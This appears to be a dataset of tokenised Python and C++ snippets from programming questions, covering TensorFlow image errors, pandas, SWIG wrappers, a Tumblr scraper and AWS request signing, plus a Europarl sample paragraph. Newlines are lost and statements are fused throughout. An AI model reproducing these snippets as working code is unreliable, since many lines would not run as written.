"Resumption of the sessionI declare resumed the session of the European Parliament adjourned on Friday 17 December 1999 , and I would like once again to wish you a happy new year in the hope that you enjoyed a pleasant festive period .Although , as you will have seen , the dreaded & apos ; millennium bug & apos ; failed to materialise , still the people in a number of countries suffered a series of natural disasters that truly were dreadful .You have requested a debate on this subject in the course of the next few days , during this part @ - @ session .In the meantime , I should like to observe a minute & apos ; s silence , as a number of Members have requested , on behalf of all the victims concerned , particularly those of the terrible storms , in the various countries of the European Union . > > > word_freq = Counter ( ) > > > for line in text.split ( '\n ' ) : ... for word in line.split ( ) : ... word_freq [ word ] +=1 ... > > > from collections import OrderedDict > > > sorted_word_freq = OrderedDict ( ) > > > for word , freq in word_freq.most_common ( ) : ... sorted_word_freq [ word ] = freq ... > > > import numpy as np > > > words = word_freq.keys ( ) > > > freqs = word_freq.values ( ) > > > sorted_word_index = np.argsort ( freqs ) # lowest to highest > > > sorted_word_freq_with_numpy = OrderedDict ( ) > > > for idx in reversed ( sorted_word_index ) : ... sorted_word_freq_with_numpy [ words [ idx ] ] = freqs [ idx ] ..."
[ collections ] /home/user/collection1 = /home/user/collection1/home/user/collection2 = /home/user/collection2
"tensorflow.python.framework.errors_impl.InvalidArgumentError : Invalid PNG data , size 135347 [ [ { { node case/cond/cond_jpeg/decode_image/cond_jpeg/cond_png/DecodePng } } = DecodePng [ channels=3 , dtype=DT_UINT8 , _device= '' /device : CPU:0 '' ] ( case/cond/cond_jpeg/decode_image/cond_jpeg/cond_png/cond_gif/DecodeGif/Switch:1 , ^case/Assert/AssertGuard/Merge ) ] ] [ [ node IteratorGetNext ( defined at object_detection/model_main.py:105 ) = IteratorGetNext [ output_shapes= [ [ 24 ] , [ 24,300,300,3 ] , [ 24,2 ] , [ 24,3 ] , [ 24,100 ] , [ 24,100,4 ] , [ 24,100,2 ] , [ 24,100,2 ] , [ 24,100 ] , [ 24,100 ] , [ 24,100 ] , [ 24 ] ] , output_types= [ DT_INT32 , DT_FLOAT , DT_INT32 , DT_INT32 , DT_FLOAT , DT_FLOAT , DT_FLOAT , DT_FLOAT , DT_INT32 , DT_BOOL , DT_FLOAT , DT_INT32 ] , _device= '' /job : localhost/replica:0/task:0/device : CPU:0 '' ] ( IteratorV2 ) ] ] def preprocess_image ( image ) : image = tf.image.decode_png ( image , channels=3 ) image = tf.image.resize_images ( image , [ 192 , 192 ] ) image /= 255.0 # normalize to [ 0,1 ] range return imagedef load_and_preprocess_image ( path ) : image = tf.read_file ( path ) return preprocess_image ( image ) mobile_net = tf.keras.applications.MobileNetV2 ( input_shape= ( 192 , 192 , 3 ) , include_top=False ) mobile_net.trainable=Falsepath_ds = tf.data.Dataset.from_tensor_slices ( images ) image_ds = path_ds.map ( load_and_preprocess_image , num_parallel_calls=4 ) def change_range ( image ) : return ( 2*image-1 ) keras_ds = image_ds.map ( change_range ) keras_ds = keras_ds.batch ( 1 ) for i , batch in tqdm ( enumerate ( iter ( keras_ds ) ) ) : try : feature_map_batch = mobile_net ( batch ) except KeyboardInterrupt : break except : print ( images [ i ] ) import scipyimages = images [ 1258 : ] print ( scipy.misc.imread ( images [ 0 ] ) ) import matplotlib.pyplot as pltprint ( plt.imread ( images [ 0 ] ) ) import cv2print ( cv2.imread ( images [ 0 ] ) ) import skimageprint ( skimage.io.imread ( images [ 0 ] ) ) ... try to run inference in Tensorflow tf.enable_eager_execution ( ) for i , image in enumerate ( images ) : try : with tf.gfile.GFile ( image , 'rb ' ) as fid : image_data = fid.read ( ) image_tensor = tf.image.decode_png ( image_data , channels=3 , name=None ) except : print ( `` Failed : `` , i , image_tensor )"
"# This script prints all the posts ( including tags , comments ) and also the # first 20notes from all the Tumblr blogs.import pytumblr # Authenticate via API Keyclient = pytumblr.TumblrRestClient ( 'myapikey ' ) # offset = 0 # Make the requestclient.posts ( 'staff ' , limit=2000 , offset=0 , reblog_info=True , notes_info=True , filter='html ' ) # print out into a .txt filewith open ( 'out.txt ' , ' w ' ) as f : print > > f , client.posts ( 'staff ' , limit=2000 , offset=0 , reblog_info=True , notes_info=True , filter='html ' ) import pytumblr # Authenticate via API Keyclient = pytumblr.TumblrRestClient ( 'myapikey ' ) blog = ( 'staff ' ) def getAllPosts ( client , blog ) : offset = 0while True : posts = client.posts ( blog , limit=20 , offset=offset , reblog_info=True , notes_info=True ) if not posts : return for post in posts : yield post offset += 20"
"% apply exportedClassType & OUTPUT { exportedClassType & result } ; // interface.i % apply exportedClassType & OUTPUT { exportedClassType & result } ; int getClassType ( exportedClassType & result ) ; // interface_wrap.cxxSWIGINTERN PyObject *_wrap_getClassType ( PyObject *SWIGUNUSEDPARM ( self ) , PyObject *args ) { PyObject *resultobj = 0 ; exportedClassType *arg1 = 0 ; void *argp1 = 0 ; int res1 = 0 ; PyObject * obj0 = 0 ; int result ; if ( ! PyArg_ParseTuple ( args , ( char * ) '' O : getClassType '' , & obj0 ) ) SWIG_fail ; res1 = SWIG_ConvertPtr ( obj0 , & argp1 , SWIGTYPE_p_exportedClassType , 0 ) ; if ( ! SWIG_IsOK ( res1 ) ) { SWIG_exception_fail ( SWIG_ArgError ( res1 ) , `` in method ' '' `` getClassType '' `` ' , argument `` `` 1 '' '' of type ' '' `` exportedClassType & '' '' ' '' ) ; } if ( ! argp1 ) { SWIG_exception_fail ( SWIG_ValueError , `` invalid null reference `` `` in method ' '' `` getClassType '' `` ' , argument `` `` 1 '' '' of type ' '' `` exportedClassType & '' '' ' '' ) ; } arg1 = reinterpret_cast < exportedClassType * > ( argp1 ) ; result = ( int ) getClassType ( *arg1 ) ; resultobj = SWIG_From_int ( static_cast < int > ( result ) ) ; return resultobj ; fail : return NULL ; } // wrapper.pydef getClassType ( result ) : return _wrapper.getClassType ( result ) getClassType = _wrapper.getClassType // interface.i % apply bool & OUTPUT { bool & result } ; int getSimpleType ( bool & result ) ; // interface_wrap.cxxSWIGINTERN PyObject *_wrap_getSimpleType ( PyObject *SWIGUNUSEDPARM ( self ) , PyObject *args ) { PyObject *resultobj = 0 ; bool *arg1 = 0 ; bool temp1 ; int res1 = SWIG_TMPOBJ ; int result ; arg1 = & temp1 ; if ( ! PyArg_ParseTuple ( args , ( char * ) '' : getSimpleType '' ) ) SWIG_fail ; result = ( int ) getSimpleType ( *arg1 ) ; resultobj = SWIG_From_int ( static_cast < int > ( result ) ) ; if ( SWIG_IsTmpObj ( res1 ) ) { resultobj = SWIG_Python_AppendOutput ( resultobj , SWIG_From_bool ( ( *arg1 ) ) ) ; } else { int new_flags = SWIG_IsNewObj ( res1 ) ? ( SWIG_POINTER_OWN | 0 ) : 0 ; resultobj = SWIG_Python_AppendOutput ( resultobj , SWIG_NewPointerObj ( ( void* ) ( arg1 ) , SWIGTYPE_p_bool , new_flags ) ) ; } return resultobj ; fail : return NULL ; } // wrapper.pydef getSimpleType ( ) : return _wrapper.getSimpleType ( ) getSimpleType = _wrapper.getSimpleType"
def callback ( text ) : print '\r ' + text.upper ( ) read_input ( callback )
"def mg2coords ( X , Y , Z ) : return np.vstack ( [ X.ravel ( ) , Y.ravel ( ) , Z.ravel ( ) ] ) .T def rotz ( angle , point ) : rad = np.radians ( angle ) sin = np.sin ( rad ) cos = np.cos ( rad ) rot = [ [ cos , -sin , 0 ] , [ sin , cos , 0 ] , [ 0 , 0 , 1 ] ] return np.dot ( rot , point )"
"class Planet : def __init__ ( self , name ) : self.name = name ( ... ) def destroy ( self ) : ( ... ) class Undestroyable ( Planet ) : def __init__ ( self , name ) : super ( ) .__init__ ( name ) ( ... ) # Now it should n't have the destroy ( self ) function Undestroyable ( 'This Planet ' ) .destroy ( ) AttributeError : Undestroyable has no attribute 'destroy '"
language : pythoninstall : `` pip install tox '' script : `` tox '' language : pythonpython : - `` 2.6 '' - `` 2.7 '' - `` 3.2 '' - `` 3.3 '' - `` 3.4 '' - `` 3.5.0b3 '' - `` 3.5-dev '' - `` nightly '' # also fails with just ` nosetest ` and no ` install ` stepinstall : `` pip install coverage unittest2 '' script : `` nosetests -- with-coverage -- cover-package=pyiterable '' - ... - < module > - tests ( for the module ) - ...
"from numpy import *from scipy.sparse import *n = 100000 ; i = xrange ( n ) ; j = xrange ( n ) ; data = ones ( n ) ; A=csr_matrix ( ( data , ( i , j ) ) ) ; x = A [ i , j ] 500033 function calls in 8.718 CPU seconds Ordered by : internal time ncalls tottime percall cumtime percall filename : lineno ( function ) 100000 7.933 0.000 8.156 0.000 csr.py:265 ( _get_single_element ) 1 0.271 0.271 8.705 8.705 csr.py:177 ( __getitem__ ) ( ... )"
"df = pd.DataFrame ( [ [ ' A ' , 2017 , 1 ] , [ ' A ' , 2019 , 1 ] , [ ' B ' , 2017 , 1 ] , [ ' B ' , 2018 , 1 ] , [ ' C ' , 2016 , 1 ] , [ ' C ' , 2019 , 1 ] , ] , columns= [ 'ID ' , 'year ' , 'number ' ] ) ID year number0 A 2017 11 A 2018 02 A 2019 13 B 2017 14 B 2018 15 C 2016 16 C 2017 07 C 2018 08 C 2019 1 min_max_dict = df [ [ 'ID ' , 'year ' ] ] .groupby ( 'ID ' ) .agg ( [ min , max ] ) .to_dict ( 'index ' ) new_ix = [ [ ] , [ ] ] for id_ in df [ 'ID ' ] .unique ( ) : for year in range ( min_max_dict [ id_ ] [ ( 'year ' , 'min ' ) ] , min_max_dict [ id_ ] [ ( 'year ' , 'max ' ) ] +1 ) : new_ix [ 0 ] .append ( id_ ) new_ix [ 1 ] .append ( year ) df.set_index ( [ 'ID ' , 'year ' ] , inplace=True ) df = df.reindex ( new_ix , fill_value=0 ) .reset_index ( ) ID year number0 A 2017 11 A 2018 02 A 2019 13 B 2017 14 B 2018 15 C 2016 16 C 2017 07 C 2018 08 C 2019 1"
"# ! /usr/bin/env python '' '' '' Farmers marketUsage : farmersmarket.py buy -i < item > -q < quantity > [ < quantity > ] [ -p < price > ] [ -dvh ] farmersmarket.py -d | -- debug farmersmarket.py -v | -- version farmersmarket.py -h | -- helpOptions : -i -- item Item . -q -- quantity Quantity . -p -- price Price . -d -- debug Show debug messages . -h -- help Show this screen . -v -- version Show version . `` `` '' from docopt import docoptprint docopt ( __doc__ ) farmersmarket.py buy -- item eggs -- quantity 100 115 -- price 0.25 { ' -- debug ' : False , ' -- help ' : False , ' -- item ' : True , ' -- price ' : True , ' -- quantity ' : True , ' -- version ' : False , ' < item > ' : 'eggs ' , ' < price > ' : ' 0.25 ' , ' < quantity > ' : [ '100 ' , '115 ' ] , 'buy ' : True } farmersmarket.py buy -- item eggs -- quantity 471 -- price 0.25 { ' -- debug ' : False , ' -- help ' : False , ' -- item ' : True , ' -- price ' : True , ' -- quantity ' : True , ' -- version ' : False , ' < item > ' : 'eggs ' , ' < price > ' : None , ' < quantity > ' : [ '471 ' , ' 0.25 ' ] , 'buy ' : True }"
"Shnm = my_pyx.get_sheet_names ( ) sheet = my_pyx.get_sheet_by_name ( Shnm [ 0 ] ) from openpyxl import load_workbook # Class to manage excel data with openpyxl.class Copy_excel : def __init__ ( self , src ) : self.wb = load_workbook ( src ) self.ws = self.wb.get_sheet_by_name ( sheet ) self.dest= '' destination.xlsx '' # Write the value in the cell defined by row_dest+column_dest def write_workbook ( self , row_dest , column_dest , value ) : c = self.ws.cell ( row = row_dest , column = column_dest ) c.value = value # Save excel file def save_excel ( self ) : self.wb.save ( self.dest ) row_dest=2column_dest=6 workbook = Copy_excel ( my_file ) data=60workbook.write_workbook ( 2,6 , data ) workbook.save_excel ( ) self.ws = self.wb [ sheet ]"
"# this does dirty magic , like generating the reverse dependency graph , # and preparing the setters that invalidate the cached values @ dataflow_classclass Test ( object ) : def calc_a ( self ) : return self.b + self.c def calc_c ( self ) : return self.d * 2 a = managed_property ( calculate=calc_a , depends_on= ( ' b ' , ' c ' ) ) b = managed_property ( default=0 ) c = managed_property ( calculate=calc_c , depends_on= ( 'd ' , ) ) d = managed_property ( default=0 ) t = Test ( ) print t.a # a has not been initialized , so it calls calc_a # gets b value # c has not been initialized , so it calls calc_c # c value is calculated and stored in t.__c # a value is calculated and stored in t.__at.b = 1 # invalidates the calculated value stored in self.__aprint t.a # a has been invalidated , so it calls calc_a # gets b value # gets c value , from t.__c # a value is calculated and stored in t.__aprint t.a # gets value from t.__at.d = 2 # invalidates the calculated values stored in t.__a and t.__c"
"nosetests -- with-coverage -x ... Name Stmts Miss Cover Missing -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -CLOCK 39 33 15 % 3 , 7-13 , 17 , 20-25 , 28-47LFU 42 1 98 % 52LRU 95 9 91 % 12 , 64 , 68 , 101 , 115-118 , 131LRU10 54 1 98 % 68LRU3 54 1 98 % 68argparse 1177 1177 0 % 3-2361cache 86 33 62 % 36-47 , 86-89 , 95-116common 87 54 38 % 17 , 20 , 23 , 28 , 31-32 , 35-36 , 39 , 42 , 46 , 48 , 50 , 52 , 54 , 57-64 , 67-68 , 72-89 , 95-96 , 102-107 , 112-118 , 123ctypes 341 341 0 % 4-555ctypes._endian 35 35 0 % 4-64numpy 56 56 0 % 107-197numpy.__config__ 27 27 0 % 3-32numpy._import_tools 224 224 0 % 1-348numpy.add_newdocs 275 275 0 % 11-7459numpy.compat 8 8 0 % 11-20numpy.compat._inspect 106 106 0 % 8-221numpy.compat.py3k 57 57 0 % 5-89numpy.core 56 56 0 % 1-74numpy.core._internal 350 350 0 % 7-570numpy.core._methods 72 72 0 % 6-130numpy.core.arrayprint 354 354 0 % 6-752numpy.core.defchararray 364 364 0 % 18-2686numpy.core.fromnumeric 310 310 0 % 4-2918numpy.core.function_base 24 24 0 % 1-173numpy.core.getlimits 132 132 0 % 4-306numpy.core.info 3 3 0 % 84-87numpy.core.machar 186 186 0 % 8-338numpy.core.memmap 83 83 0 % 1-305numpy.core.numeric 523 523 0 % 1-2730numpy.core.numerictypes 381 381 0 % 83-1035numpy.core.records 356 356 0 % 37-808numpy.core.shape_base 50 50 0 % 1-277numpy.ctypeslib 187 187 0 % 52-426numpy.fft 7 7 0 % 1-11numpy.fft.fftpack 109 109 0 % 33-1119numpy.fft.helper 51 51 0 % 5-223numpy.fft.info 2 2 0 % 177-179numpy.lib 38 38 0 % 1-45numpy.lib._datasource 178 178 0 % 34-656numpy.lib._iotools 372 372 0 % 4-874numpy.lib.arraypad 383 383 0 % 6-1469numpy.lib.arraysetops 98 98 0 % 27-450numpy.lib.arrayterator 72 72 0 % 10-224numpy.lib.financial 112 112 0 % 11-735numpy.lib.format 178 178 0 % 137-614numpy.lib.function_base 889 889 0 % 1-3555numpy.lib.index_tricks 250 250 0 % 1-849numpy.lib.info 3 3 0 % 148-151numpy.lib.nanfunctions 138 138 0 % 17-838numpy.lib.npyio 729 729 0 % 1-1899numpy.lib.polynomial 386 386 0 % 5-1266numpy.lib.scimath 55 55 0 % 18-560numpy.lib.shape_base 200 200 0 % 1-834numpy.lib.stride_tricks 48 48 0 % 8-121numpy.lib.twodim_base 116 116 0 % 4-929numpy.lib.type_check 104 104 0 % 4-605numpy.lib.ufunclike 23 23 0 % 6-177numpy.lib.utils 517 517 0 % 1-1134numpy.linalg 6 6 0 % 45-54numpy.linalg.info 2 2 0 % 35-37numpy.linalg.linalg 530 530 0 % 11-2131numpy.ma 15 15 0 % 39-58numpy.ma.core 2324 2324 0 % 23-7243numpy.ma.extras 610 610 0 % 11-1885numpy.matrixlib 6 6 0 % 4-12numpy.matrixlib.defmatrix 286 286 0 % 1-1094numpy.polynomial 11 11 0 % 16-29numpy.polynomial.chebyshev 432 432 0 % 88-2015numpy.polynomial.hermite 382 382 0 % 60-1750numpy.polynomial.hermite_e 379 379 0 % 60-1746numpy.polynomial.laguerre 379 379 0 % 60-1742numpy.polynomial.legendre 386 386 0 % 84-1768numpy.polynomial.polynomial 302 302 0 % 56-1493numpy.polynomial.polytemplate 4 4 0 % 12-17numpy.polynomial.polyutils 67 67 0 % 34-384numpy.random 13 13 0 % 89-114numpy.random.info 3 3 0 % 85-89numpy.version 7 7 0 % 3-10statistics 19 2 89 % 24-25statistics.countingghost 84 44 48 % 43-60 , 66-69 , 75-80 , 83-89 , 93-104 , 107 , 110-113statistics.rounder 89 17 81 % 29 , 40 , 70-83 , 112-113 -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -TOTAL 17686 17145 3 % -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 3 tests in 3.279sOK"
typedef struct My_Api_V2 { int ( __cdecl *IsValidInt ) ( int i ) ; int ( __cdecl *InvalidInt ) ( ) ; int ( __cdecl *IsValidSize ) ( size_t i ) ; } my_Api_V2 ; const my_Api_V2* GetMyApi ( int version ) ; // This function is accessed from DLL from ctypes import *my_dll = cdll.LoadLibrary ( path_to_my_dll ) my_api = my_dll.GetMyApimy_api.argtypes [ c_int ] # version numbermy_api.restypes = c_void_pfirstfuncptr = my_api ( 2 ) firstfunc = prototype ( firstfuncptr ) firstfunc.argtypes [ c_int ] firstfunc.restypes = c_inttest = firstfunc ( 23 )
"import numpy as npimport pandas as pda = np.random.randn ( 10,10 ) > a [ :3,0 , newaxis ] array ( [ [ -1.91687144 ] , [ -0.6399471 ] , [ -0.10005721 ] ] ) b = pd.DataFrame ( a ) > b.ix [ :3,0 ] 0 -1.9168711 -0.6399472 -0.1000573 0.251988"
"import numpy , sysprint sys.getsizeof ( numpy.int8 ( 1 ) )"
"parser = argparse.ArgumentParser ( description='someDesc ' ) parser.add_argument ( -a , required=true , choices= [ x , y , z ] ) parser.add_argument ( ... ) python test -a x // not fine ... needs additional MANDATORY argument bpython test -a y // fine ... will runpython test -a z // fine ... will run python test -a x -b `` ccc '' // fine ... will run"
"with gui.vertical : text = gui.label ( 'hello ! ' ) items = gui.selection ( [ 'one ' , 'two ' , 'three ' ] ) with gui.button ( 'click me ! ' ) : def on_click ( ) : text.value = items.value text.foreground = red from __future__ import with_statementclass button ( object ) : def __enter__ ( self ) : # do some setup pass def __exit__ ( self , exc_type , exc_value , traceback ) : # XXX : how can we find the testing ( ) function ? passwith button ( ) : def testing ( ) : pass"
"# shape is ( N0=4 , m0=4 ) 1 1 0 42 4 2 11 2 3 54 4 4 1 # shape ( N=N0 , m=data.max ( ) +1 ) :1 2 0 0 1 00 1 2 0 1 00 1 1 1 0 10 1 0 0 3 0"
"from wordcloud import WordCloudfrom matplotlib import pyplot as plttext= '' '' '' Softrock 40 - close to the 6 MHz that the P6D requires ( 6.062 according ) - https : //groups.yahoo.com/neo/groups/softrock40/conversations/messagesI want the USB model that has a controllable ( not fixed ) central frequency . `` `` '' wordcloud = WordCloud ( ) .generate ( text ) plt.imshow ( wordcloud , interpolation='bilinear ' ) plt.axis ( `` off '' ) plt.show ( ) text= '' '' '' תחילתו של חורף מאכזב למדיי , מומחי המים בישראל מאמינים כי לראשונה השנה מפלס הכנרת יעלה בצורה משמעותית מגשמי הסערה שתחל היום '' '' '' wordcloud = WordCloud ( ) .generate ( text ) plt.imshow ( wordcloud , interpolation='bilinear ' ) plt.axis ( `` off '' ) plt.show ( )"
"`` /usr/lib/python2.7/ssl.py '' , line 305 : self._sslobj.do_handshake ( ) File `` myTwitterScrapingScript.py '' , line 245 , in checkStatus status = api.rate_limit_status ( ) File `` /scratch/bin/python-virtual-environments/tweepy-2/local/lib/python2.7/site-packages/tweepy/binder.py '' , line 185 , in _call return method.execute ( ) File `` /scratch/bin/python-virtual-environments/tweepy-2/local/lib/python2.7/site-packages/tweepy/binder.py '' , line 146 , in execute conn.request ( self.method , url , headers=self.headers , body=self.post_data ) File `` /usr/lib/python2.7/httplib.py '' , line 958 , in request self._send_request ( method , url , body , headers ) File `` /usr/lib/python2.7/httplib.py '' , line 992 , in _send_request self.endheaders ( body ) File `` /usr/lib/python2.7/httplib.py '' , line 954 , in endheaders self._send_output ( message_body ) File `` /usr/lib/python2.7/httplib.py '' , line 814 , in _send_output self.send ( msg ) File `` /scratch/bin/python-virtual-environments/tweepy-2/local/lib/python2.7/site-packages/tweepy/binder.py '' , line 185 , in _call return method.execute ( ) File `` /scratch/bin/python-virtual-environments/tweepy-2/local/lib/python2.7/site-packages/tweepy/binder.py '' , line 146 , in execute conn.request ( self.method , url , headers=self.headers , body=self.post_data ) File `` /usr/lib/python2.7/httplib.py '' , line 958 , in request self._send_request ( method , url , body , headers ) File `` /usr/lib/python2.7/httplib.py '' , line 992 , in _send_request self.endheaders ( body ) File `` /usr/lib/python2.7/httplib.py '' , line 954 , in endheaders self._send_output ( message_body ) File `` /usr/lib/python2.7/httplib.py '' , line 814 , in _send_output self.send ( msg ) File `` /usr/lib/python2.7/httplib.py '' , line 776 , in send self.connect ( ) File `` /usr/lib/python2.7/httplib.py '' , line 1161 , in connect self.sock = ssl.wrap_socket ( sock , self.key_file , self.cert_file ) File `` /usr/lib/python2.7/ssl.py '' , line 381 , in wrap_socket ciphers=ciphers ) File `` /usr/lib/python2.7/ssl.py '' , line 143 , in __init__ self.do_handshake ( ) File `` /usr/lib/python2.7/ssl.py '' , line 305 , in do_handshake self._sslobj.do_handshake ( )"
source /python/ve/ < name > /bin/activate
"# http : //docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html # AWS Version 4 signing example # EC2 API ( DescribeRegions ) # See : http : //docs.aws.amazon.com/general/latest/gr/sigv4_signing.html # This version makes a GET request and passes the signature # in the Authorization header.import sys , os , base64 , datetime , hashlib , hmacsys.path.append ( '../ ' ) import requests # pip install requests # Read AWS access key from env . variables or configuration file . Best practice is NOT # to embed credentials in code.access_key = os.environ.get ( 'AWS_ACCESS_KEY_ID ' ) secret_key = os.environ.get ( 'AWS_SECRET_ACCESS_KEY ' ) if access_key is None or secret_key is None : print 'No access key is available . ' sys.exit ( ) # ************* REQUEST VALUES *************method = 'GET ' # # service = 'ec2 ' # # host = 'ec2.amazonaws.com ' # # region = 'us-east-1 ' # # endpoint = 'https : //ec2.amazonaws.com ' # # request_parameters = 'Action=DescribeRegions & Version=2013-10-15 ' # # # # # START MODIFIED VALUES # # # # # # # service='polly'host='polly.eu-west-1.amazonaws.com'region='eu-west-1'endpoint='https : //'+host+'/v1/voices'request_parameters='LanguageCode=en-US ' # # # # # # # END MODIFIED VALUES # # # # # # # # Key derivation functions . See : # http : //docs.aws.amazon.com/general/latest/gr/signature-v4-examples.html # signature-v4-examples-pythondef sign ( key , msg ) : return hmac.new ( key , msg.encode ( 'utf-8 ' ) , hashlib.sha256 ) .digest ( ) def getSignatureKey ( key , dateStamp , regionName , serviceName ) : kDate = sign ( ( 'AWS4 ' + key ) .encode ( 'utf-8 ' ) , dateStamp ) kRegion = sign ( kDate , regionName ) kService = sign ( kRegion , serviceName ) kSigning = sign ( kService , 'aws4_request ' ) return kSigning # Create a date for headers and the credential stringt = datetime.datetime.utcnow ( ) amzdate = t.strftime ( ' % Y % m % dT % H % M % SZ ' ) datestamp = t.strftime ( ' % Y % m % d ' ) # Date w/o time , used in credential scope # ************* TASK 1 : CREATE A CANONICAL REQUEST ************* # http : //docs.aws.amazon.com/general/latest/gr/sigv4-create-canonical-request.html # Step 1 is to define the verb ( GET , POST , etc . ) -- already done. # Step 2 : Create canonical URI -- the part of the URI from domain to query # string ( use '/ ' if no path ) canonical_uri = '/ ' # Step 3 : Create the canonical query string . In this example ( a GET request ) , # request parameters are in the query string . Query string values must # be URL-encoded ( space= % 20 ) . The parameters must be sorted by name. # For this example , the query string is pre-formatted in the request_parameters variable.canonical_querystring = request_parameters # Step 4 : Create the canonical headers and signed headers . Header names # must be trimmed and lowercase , and sorted in code point order from # low to high . Note that there is a trailing \n.canonical_headers = 'host : ' + host + '\n ' + ' x-amz-date : ' + amzdate + '\n ' # Step 5 : Create the list of signed headers . This lists the headers # in the canonical_headers list , delimited with `` ; '' and in alpha order. # Note : The request can include any headers ; canonical_headers and # signed_headers lists those that you want to be included in the # hash of the request . `` Host '' and `` x-amz-date '' are always required.signed_headers = 'host ; x-amz-date ' # Step 6 : Create payload hash ( hash of the request body content ) . For GET # requests , the payload is an empty string ( `` '' ) .payload_hash = hashlib.sha256 ( `` ) .hexdigest ( ) # Step 7 : Combine elements to create create canonical requestcanonical_request = method + '\n ' + canonical_uri + '\n ' + canonical_querystring + '\n ' + canonical_headers + '\n ' + signed_headers + '\n ' + payload_hash # ************* TASK 2 : CREATE THE STRING TO SIGN************* # Match the algorithm to the hashing algorithm you use , either SHA-1 or # SHA-256 ( recommended ) algorithm = 'AWS4-HMAC-SHA256'credential_scope = datestamp + '/ ' + region + '/ ' + service + '/ ' + 'aws4_request'string_to_sign = algorithm + '\n ' + amzdate + '\n ' + credential_scope + '\n ' + hashlib.sha256 ( canonical_request ) .hexdigest ( ) # ************* TASK 3 : CALCULATE THE SIGNATURE ************* # Create the signing key using the function defined above.signing_key = getSignatureKey ( secret_key , datestamp , region , service ) # Sign the string_to_sign using the signing_keysignature = hmac.new ( signing_key , ( string_to_sign ) .encode ( 'utf-8 ' ) , hashlib.sha256 ) .hexdigest ( ) # ************* TASK 4 : ADD SIGNING INFORMATION TO THE REQUEST ************* # The signing information can be either in a query string value or in # a header named Authorization . This code shows how to use a header. # Create authorization header and add to request headersauthorization_header = algorithm + ' ' + 'Credential= ' + access_key + '/ ' + credential_scope + ' , ' + 'SignedHeaders= ' + signed_headers + ' , ' + 'Signature= ' + signature # The request can include any headers , but MUST include `` host '' , `` x-amz-date '' , # and ( for this scenario ) `` Authorization '' . `` host '' and `` x-amz-date '' must # be included in the canonical_headers and signed_headers , as noted # earlier . Order here is not significant. # Python note : The 'host ' header is added automatically by the Python 'requests ' library.headers = { ' x-amz-date ' : amzdate , 'Authorization ' : authorization_header } # ************* SEND THE REQUEST *************request_url = endpoint + ' ? ' + canonical_querystringprint '\nBEGIN REQUEST++++++++++++++++++++++++++++++++++++'print 'Request URL = ' + request_urlprint 'Header'print headersr = requests.get ( request_url , headers=headers ) print '\nRESPONSE++++++++++++++++++++++++++++++++++++'print 'Response code : % d\n ' % r.status_codeprint r.text BEGIN REQUEST++++++++++++++++++++++++++++++++++++Request URL = https : //polly.eu-west-1.amazonaws.com/v1/voices ? LanguageCode=en-USRESPONSE++++++++++++++++++++++++++++++++++++Response code : 403 { `` message '' : '' The request signature we calculated does not match the signature you provided . Check your AWS Secret Access Key and signing method . Consult the service documentation for details.\n\nThe Canonical String for this request should have been\n'GET\n/v1/voices\nLanguageCode=en-US\nhost : polly.eu-west-1.amazonaws.com\nx-amz-date:20170122T160127Z\n\nhost ; x-amz-date\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'\n\nThe String-to-Sign should have been\n'AWS4-HMAC-SHA256\n20170122T160127Z\n20170122/eu-west-1/polly/aws4_request\n6e1004fbcc11a73baa0c7fe9ff8d5629bada5061fdc8b03fbf307696ea41728d'\n '' }"
"x = 1/2x'Qx + c ' x A*x < = blb < = x < = ub U = quadprog ( Q , c , A , b , [ ] , [ ] , lb , ub ) ; Aeq*x = beq , x = 1/2x'Qx + c ' x A*x < = blb < = x < = ub b_lb < = A*x < = b_ublb < = x < = ub"
if x > a : print xelse : print a t : if x > 0 : t + 1 : print x
A | B | C | Date1 | Date2a1 | b1 | c1 | 1Jan1990 | 15Aug1990 < - this row should be repeated for all dates between the two dates ... ... ... ... ... ... ... ..a3 | b3 | c3 | 11May1986 | 11May1986 < - this row should NOT be repeated . Just 1 entry since both dates are same ... ... ... ... ... ... ... ... a5 | b5 | c5 | 1Dec1984 | 31Dec2017 < - this row should be repeated for all dates between the two dates ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... . A | B | C | Month | Yeara1 | b1 | c1 | 1 | 1990 < - Since date 1 column for this row was Jan 1990a1 | b1 | c1 | 2 | 1990 ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... .a1 | b1 | c1 | 7 | 1990 a1 | b1 | c1 | 8 | 1990 < - Since date 2 column for this row was Aug 1990 ... ... ... ... ... ... ... ... ..a3 | b3 | c3 | 5 | 1986 < - only 1 row since two dates in input dataframe were same for this row ... ... ... ... ... ... ... ... ... .a5 | b5 | c5 | 12 | 1984 < - since date 1 column for this row was Dec 1984a5 | b5 | c5 | 1 | 1985 ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... .a5 | b5 | c5 | 11 | 2017 a5 | b5 | c5 | 12 | 2017 < - Since date 2 column for this row was Dec 2017
ERROR : Could not find a version that satisfies the requirement tensorflow-text ( from versions : none )
"myfile = ' c : /temp/myfile.csv'df = pd.read_csv ( myfile , header= [ 0 , 1 ] , tupleize_cols=True ) pd.set_option ( 'display.multi_sparse ' , False ) df.columns = pd.MultiIndex.from_tuples ( df.columns , names= [ 'hour ' , 'field ' ] ) df df.stack ( level= [ 'hour ' ] )"
"class Trial : font = pygame.font.Font ( None , font_size ) target_dic = { let : font.render ( let , True , WHITE , BG ) for let in list ( `` ABCDEFGHJKLMNPRSTUVWX '' ) } class x : dat = 1 datlist = [ dat for i in range ( 10 ) ]"
"conda install basemapconda install gdal Assertion failed : ( 0 ) , function query , file AbstractSTRtree.cpp , line 286. import shapely.geometry as sgfrom pymongo import MongoClientfrom mpl_toolkits.basemap import Basemapp = Basemap ( projection='sinu ' , lon_0=0 , resolution= ' c ' ) projected_xy = p ( 24.4,45.1 )"
"from __future__ import * SyntaxError : future feature * is not defined ( < pyshell # 0 > , line 1 )"
